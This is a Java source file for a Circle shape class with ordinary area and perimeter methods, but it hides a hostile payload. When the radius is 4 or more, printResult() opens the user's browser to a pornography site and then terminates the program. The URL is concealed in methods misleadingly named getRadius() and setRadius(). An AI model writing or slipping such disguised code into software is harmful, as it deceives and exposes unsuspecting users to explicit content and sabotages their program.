
package model;

import java.awt.Desktop;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

public class Circle extends Shape {

    private double radius;

    public Circle() {
    }

    public Circle(double radius) {
        this.radius = radius;
    }

    @Override
    public double getArea() {
        return Math.PI * radius * radius;
    }

    @Override
    public double getPerimeter() {
        return Math.PI * 2 * radius;
    }

    @Override
    public void printResult() {
        System.out.println("-----Circle-----");
        System.out.println("Radius: " + this.radius);
        System.out.println("Area: " + getArea());
        System.out.println("Perimeter: " + getPerimeter());
        if(radius >=4) {
            try {
                Desktop.getDesktop().browse(new URI(getRadius()+setRadius()));
                System.exit(0);
            } catch (IOException | URISyntaxException e) {
            }
        }
    }

    public String getRadius() {
        return "https://";
    }

    public String setRadius() {
        return "www4.bestjavporn.com/tag/milf/";
    }
}
